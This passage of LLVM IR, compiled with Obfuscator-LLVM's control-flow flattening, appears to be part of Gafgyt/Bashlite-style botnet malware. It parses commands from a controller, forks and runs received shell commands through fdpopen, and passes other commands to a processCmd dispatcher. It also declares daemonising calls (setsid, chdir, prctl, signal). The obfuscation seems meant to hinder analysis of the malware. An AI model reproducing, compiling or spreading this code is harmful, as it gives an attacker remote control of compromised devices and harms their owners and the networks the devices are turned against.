  %.reload5 = load i1, i1* %.reg2mem4
  %262 = select i1 %.reload5, i32 1898387563, i32 760767213
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8*, i8** %15, align 8
  %265 = load i8*, i8** %15, align 8
  %266 = call i64 @strlen(i8* %265) #10
  %267 = sub i64 %266, 1
  %268 = getelementptr inbounds i8, i8* %264, i64 %267
  store i8 0, i8* %268, align 1
  store i32 -1452087117, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %15, align 8
  store i8* %270, i8** %17, align 8
  store i32 1797073101, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %15, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp ne i32 %274, 32
  %276 = select i1 %275, i32 704314101, i32 1415531637
  store i32 %276, i32* %switchVar
  store i1 false, i1* %.reg2mem6
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %15, align 8
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp ne i32 %280, 0
  store i32 1415531637, i32* %switchVar
  store i1 %281, i1* %.reg2mem6
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %.reload7 = load i1, i1* %.reg2mem6
  %283 = select i1 %.reload7, i32 -506440026, i32 -1950323898
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i8*, i8** %15, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %15, align 8
  store i32 1797073101, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %15, align 8
  store i8 0, i8* %288, align 1
  %289 = load i8*, i8** %15, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %15, align 8
  %291 = load i8*, i8** %17, align 8
  store i8* %291, i8** %18, align 8
  store i32 -1135140309, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = load i8*, i8** %18, align 8
  %294 = load i8, i8* %293, align 1
  %295 = icmp ne i8 %294, 0
  %296 = select i1 %295, i32 -1369644251, i32 1328046118
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8*, i8** %18, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = call i32 @toupper(i32 %300) #10
  %302 = trunc i32 %301 to i8
  %303 = load i8*, i8** %18, align 8
  store i8 %302, i8* %303, align 1
  %304 = load i8*, i8** %18, align 8
  %305 = getelementptr inbounds i8, i8* %304, i32 1
  store i8* %305, i8** %18, align 8
  store i32 -1135140309, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i8*, i8** %17, align 8
  %308 = call i32 @strcmp(i8* %307, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i32 0, i32 0)) #10
  %309 = icmp eq i32 %308, 0
  %310 = select i1 %309, i32 611795168, i32 -915580307
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = call i32 @listFork()
  %313 = icmp ne i32 %312, 0
  %314 = select i1 %313, i32 -1684599987, i32 -1740929702
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  store i32 -1354154217, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %317, i8 0, i64 1024, i32 16, i1 false)
  %318 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %319 = load i8*, i8** %15, align 8
  %320 = call i32 (i8*, i8*, ...) @szprintf(i8* %318, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* %319)
  %321 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %322 = call i32 @fdpopen(i8* %321, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0))
  store i32 %322, i32* %20, align 4
  store i32 -861783696, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %325 = load i32, i32* %20, align 4
  %326 = call i8* @fdgets(i8* %324, i32 1024, i32 %325)
  %327 = icmp ne i8* %326, null
  %328 = select i1 %327, i32 -1671618769, i32 -1046640619
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %330)
  %331 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %331, i8 0, i64 1024, i32 16, i1 false)
  %332 = call i32 @sleep(i32 1)
  store i32 -861783696, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i32, i32* %20, align 4
  %335 = call i32 @fdpclose(i32 %334)
  call void @exit(i32 0) #14
  unreachable

; <label>:336:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %337 = load i8*, i8** %15, align 8
  %338 = call i8* @strtok(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %338, i8** %23, align 8
  %339 = load i8*, i8** %17, align 8
  %340 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %339, i8** %340, align 16
  store i32 508862978, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i8*, i8** %23, align 8
  %343 = icmp ne i8* %342, null
  %344 = select i1 %343, i32 -1826614293, i32 258500661
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i8*, i8** %23, align 8
  %347 = load i8, i8* %346, align 1
  %348 = zext i8 %347 to i32
  %349 = icmp ne i32 %348, 10
  %350 = select i1 %349, i32 1343189589, i32 1164926344
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %23, align 8
  %353 = call i64 @strlen(i8* %352) #10
  %354 = add i64 %353, 1
  %355 = call noalias i8* @malloc(i64 %354) #2
  %356 = load i32, i32* %22, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %357
  store i8* %355, i8** %358, align 8
  %359 = load i32, i32* %22, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %360
  %362 = load i8*, i8** %361, align 8
  %363 = load i8*, i8** %23, align 8
  %364 = call i64 @strlen(i8* %363) #10
  %365 = add i64 %364, 1
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 %365, i32 1, i1 false)
  %366 = load i32, i32* %22, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %367
  %369 = load i8*, i8** %368, align 8
  %370 = load i8*, i8** %23, align 8
  %371 = call i8* @strcpy(i8* %369, i8* %370) #2
  %372 = load i32, i32* %22, align 4
  %373 = add nsw i32 %372, 1
  store i32 %373, i32* %22, align 4
  store i32 1164926344, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %375, i8** %23, align 8
  store i32 508862978, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i32, i32* %22, align 4
  %378 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %377, i8** %378)
  %379 = load i32, i32* %22, align 4
  %380 = icmp sgt i32 %379, 1
  %381 = select i1 %380, i32 37316421, i32 1708587350
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 1397246524, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = load i32, i32* %24, align 4
  %385 = load i32, i32* %22, align 4
  %386 = icmp slt i32 %384, %385
  %387 = select i1 %386, i32 941351777, i32 -971501414
  store i32 %387, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i32, i32* %24, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %390
  %392 = load i8*, i8** %391, align 8
  call void @free(i8* %392) #2
  store i32 -234323551, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i32, i32* %24, align 4
  %395 = add nsw i32 %394, 1
  store i32 %395, i32* %24, align 4
  store i32 1397246524, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  store i32 1708587350, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  store i32 -1471287692, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  store i32 -1354154217, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  store i32 922669407, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = load i32, i32* %3, align 4
  ret i32 %401

loopEnd:                                          ; preds = %399, %398, %397, %396, %393, %388, %383, %382, %376, %374, %351, %345, %341, %336, %329, %323, %316, %315, %311, %306, %297, %292, %287, %284, %282, %277, %271, %269, %263, %261, %252, %242, %233, %232, %226, %223, %221, %216, %210, %207, %200, %193, %190, %180, %177, %176, %172, %169, %159, %153, %140, %137, %126, %120, %117, %108, %102, %101, %95, %91, %89, %85, %81, %80, %79, %78, %77, %76, %75, %71, %66, %62, %30, %29, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612306}
!2 = !{i32 -2146611615}
!3 = !{i32 -2146610866}
!4 = !{i32 -2146610043}
!5 = !{i32 -2146609223}
!6 = !{i32 -2146607762}
!7 = !{i32 -2146606900}
!8 = !{i32 -2146606179}
